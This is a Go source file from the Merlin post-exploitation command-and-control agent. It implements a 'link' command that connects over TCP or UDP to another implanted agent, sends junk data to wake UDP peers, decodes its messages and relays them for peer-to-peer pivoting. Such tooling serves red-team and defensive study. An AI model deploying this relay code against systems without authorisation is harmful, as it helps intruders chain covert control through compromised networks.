// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/core"
	"github.com/Ne0nd0g/merlin-agent/p2p"
)

// Link connects to the provided target over the provided protocol and establishes a peer-to-peer connection with the Agent
func Link(cmd jobs.Command) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Link(): entering into function with %+v", cmd))

	if len(cmd.Args) < 2 {
		return jobs.Results{Stderr: fmt.Sprintf("expected 2 arguments with the link command, received %d: %+v", len(cmd.Args), cmd.Args)}
	}

	// switch on first argument
	switch strings.ToLower(cmd.Args[0]) {
	case "tcp":
		return Connect("tcp", cmd.Args[1:])
	case "udp":
		return Connect("udp", cmd.Args[1:])
	default:
		return jobs.Results{
			Stderr: fmt.Sprintf("Unhandled link type: %s", cmd.Args[0]),
		}
	}
}

// Connect establishes a TCP or UDP connection to a tcp-bind or udp-bind peer-to-peer Agent
func Connect(network string, args []string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Connect(): entering into function with network: %s, args: %+v", network, args))
	linkedAgent := p2p.Agent{
		In:  make(chan messages.Base, 100),
		Out: make(chan messages.Base, 100),
	}

	switch strings.ToLower(network) {
	case "tcp":
		linkedAgent.Type = p2p.TCPBIND
	case "udp":
		linkedAgent.Type = p2p.UDPBIND
	}

	// args[0] = target (e.g., 192.168.1.10:8080)
	if len(args) <= 0 {
		results.Stderr = fmt.Sprintf("Expected 1 argument, received %d", len(args))
		return
	}

	// Establish connection to downstream agent
	conn, err := net.Dial(network, args[0])
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error attempting to link the agent: %s", err.Error())
		return
	}

	linkedAgent.Conn = conn
	linkedAgent.Remote = conn.RemoteAddr()
	var n int

	// We must first write data to the UDP connection to let the UDP bind Agent know we're listening and ready
	if linkedAgent.Type == p2p.UDPBIND {
		junk := core.RandStringBytesMaskImprSrc(rand.Intn(100))
		junk = base64.StdEncoding.EncodeToString([]byte(junk))
		cli.Message(cli.NOTE, fmt.Sprintf("Initiating UDP connection to %s sending junk data: %s", linkedAgent.Conn.(net.Conn).RemoteAddr(), junk))
		n, err = linkedAgent.Conn.(net.Conn).Write([]byte(junk))
		cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to UDP connection from %s", n, linkedAgent.Conn.(net.Conn).RemoteAddr()))
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error writing data to the UDP connection: %s", err)
			return
		}
		// Wait for linked agent first checking message
		cli.Message(cli.NOTE, fmt.Sprintf("Waiting to recieve UDP connection from %s...", linkedAgent.Conn.(net.Conn).RemoteAddr()))
	}

	data := make([]byte, 50000)
	n, err = bufio.NewReader(linkedAgent.Conn.(net.Conn)).Read(data)
	if err != nil {
		cli.Message(cli.WARN, fmt.Sprintf("there was an error reading datat from linked agent %s: %s", args[0], err))
	}
	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from linked %s agent %s at %s", n, &linkedAgent, args[0], time.Now().UTC()))

	// Decode GOB from server response into Base
	var msg messages.Delegate
	reader := bytes.NewReader(data)

	//fmt.Printf("DATA: %s\n", data)
	errD := gob.NewDecoder(reader).Decode(&msg)
	if errD != nil {
		err = fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
		return
	}

	// Store LinkedAgent
	p2p.LinkedAgents.Store(msg.Agent, linkedAgent)

	p2p.AddDelegateMessage(msg)

	results.Stdout = fmt.Sprintf("Successfully connected to %s at %s", msg.Agent, args[0])

	// The listen function is in commands/listen.go
	go listen(linkedAgent.Conn.(net.Conn))
	return
}
